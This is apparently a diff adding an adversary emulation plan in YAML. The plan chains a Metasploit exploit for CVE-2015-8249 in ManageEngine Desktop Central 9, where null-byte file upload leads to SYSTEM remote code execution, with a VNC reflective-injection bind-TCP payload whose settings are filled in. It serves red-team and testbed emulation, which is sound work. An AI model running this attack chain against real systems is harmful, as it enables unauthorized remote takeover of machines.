@@ -1,0 +1,111 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-07 21:36:18 UTC+0000
+attack_action_sequence:
+  - uuid: de6091de-bce3-456d-bf1e-0a88936f06ed
+    name: ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
+    id:
+      - T1203
+      - T1068
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - Windows
+    tactics:
+      - Execution
+      - Privilege Escalation
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation for Privilege Escalation
+      - Exploitation of Remote Services
+    description: |-
+      This module exploits a vulnerability found in ManageEngine Desktop Central 9. When uploading a 7z file, the FileUploadServlet class does not check the user-controlled ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to inject a null bye at the end of the value to create a malicious file with an arbitrary file type, and then place it under a directory that allows server-side scripts to run, which results in remote code execution under the context of SYSTEM. 
+       Please note that by default, some ManageEngine Desktop Central versions run on port 8020, but older ones run on port 8040. Also, using this exploit will leave debugging information produced by FileUploadServlet in file rdslog0.txt. 
+       This exploit was successfully tested on version 9, build 90109 and build 91084.
+    testbed:
+      CVE:
+        - CVE-2015-8249
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("windows/http/manageengine_connectionid_write")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 8020
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      DOMAIN:
+        CurrentSetting: WORKSTATION
+        Required: true
+        Description: The domain to use for Windows authentication
+      TARGETURI:
+        CurrentSetting: /
+        Required: true
+        Description: The base path for ManageEngine Desktop Central
+  - uuid: 51054306-eb96-49eb-8f31-c54f90b79ab4
+    name: VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+    id:
+      - T1055.001
+      - T1219
+    source: Metasploit Payload
+    supported_platforms:
+      - Windows
+    tactics:
+      - Execution
+      - Persistence
+      - Command and Control
+    technique:
+      - T1055.001
+      - T1219
+    description: |-
+      Inject a VNC Dll via a reflective loader (staged).
+      Listen for a connection (No NX)
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("windows/vncinject/bind_nonx_tcp")
+    arguments:
+      AUTOVNC:
+        CurrentSetting: 'true'
+        Required: true
+        Description: Automatically launch VNC viewer if present
+      DisableCourtesyShell:
+        CurrentSetting: 'true'
+        Required: false
+        Description: Disables the Metasploit Courtesy shell
+      EXITFUNC:
+        CurrentSetting: process
+        Required: true
+        Description: "Exit technique (Accepted: '', seh, thread, process, none)"
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+      RHOST:
+        CurrentSetting: ''
+        Required: false
+        Description: The target address
+      VNCHOST:
+        CurrentSetting: 127.0.0.1
+        Required: true
+        Description: The local host to use for the VNC proxy
+      VNCPORT:
+        CurrentSetting: '5900'
+        Required: true
+        Description: The local port to use for the VNC proxy
+      ViewOnly:
+        CurrentSetting: 'true'
+        Required: false
+        Description: Runs the viewer in view mode
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2015-8249
